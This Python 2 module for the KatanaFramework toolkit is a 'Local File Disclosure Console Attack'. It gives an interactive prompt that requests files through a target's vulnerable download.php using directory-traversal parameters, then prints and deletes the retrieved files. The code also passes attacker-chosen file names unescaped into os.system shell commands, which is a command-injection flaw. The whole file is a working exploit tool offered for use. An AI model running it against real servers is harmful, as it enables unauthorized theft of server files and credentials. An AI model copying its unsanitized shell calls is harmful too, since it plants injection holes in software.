# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
import httplib,urllib
import urllib2
import os
# END LIBRARIES

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.1"
	init.Description        ="Local File Disclosure Console Attack."
	init.CodeName           ="web/clt.lfd"
	init.DateCreation       ="14/01/2016"      
	init.LastModification   ="25/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                RQ     DESCRIPTION
		'target':[LOCAL_IP            ,True ,'Host Target'],
		'port'  :[HTTP_PORT           ,False,'Port Target'],
		'file'  :["/download.php"     ,True ,'Vulnerable file']
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	NET.CheckConnectionHost(init.var['target'],init.var['port'],5)
	url = "http://"+init.var['target']+":"+init.var['port']+init.var['file']
	file_name = url.split('/')[-1]
	u = urllib2.urlopen(url)

	printk.inf(2,"LFD Console")
	HelpBanner  = [["Commands","Description","Example"]]
	HelpBanner += [["get","get file","get file=index.php&dir=../"]]
	GRAPHICAL.MakeTable(HelpBanner)

	command=0
	while command!="exit":
		command=raw_input(ClientPrompt(init.CodeName,"lfd"))
		if command[:3] == "get":
			submit=command[4:]
			url = "http://"+init.var['target']+":"+init.var['port']+init.var['file']+"?"+submit
			file_name = url.split('/')[-1]
			file_create = submit.split('=')[1]
			u = urllib2.urlopen(url)
			f = open("tmp/"+file_create,'w')

			meta = u.info()
			file_size = int(meta.getheaders("Content-Length")[0])
			if file_size != 0:
				printk.inf("Request "+url)
				printk.inf("Downloading %s Bytes: %s" % (file_create, file_size))
				file_size_dl = 0
				block_sz = 8192
				while True:
					buffer = u.read(block_sz)
					if not buffer:break
					file_size_dl += len(buffer)
					f.write(buffer)
					status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
					status = status + chr(8)*(len(status)+1)
					printAlert(3,"Completed "+status)
					f.close()
					print " \n -------------------------------- File "+file_create+" Size: "+str(file_size)+" \n"
					os.system("cat 'tmp/"+file_create+"' -b -v ")
					os.system("rm 'tmp/"+file_create+"'")
					print " \n -------------------------------- File "+file_create+" Size: "+str(file_size)+" \n"
			else:printk.err("File empy or no exist.")
		elif command == "help":GRAPHICAL.MakeTable(HelpBanner)

# END CODE MODULE ############################################################################################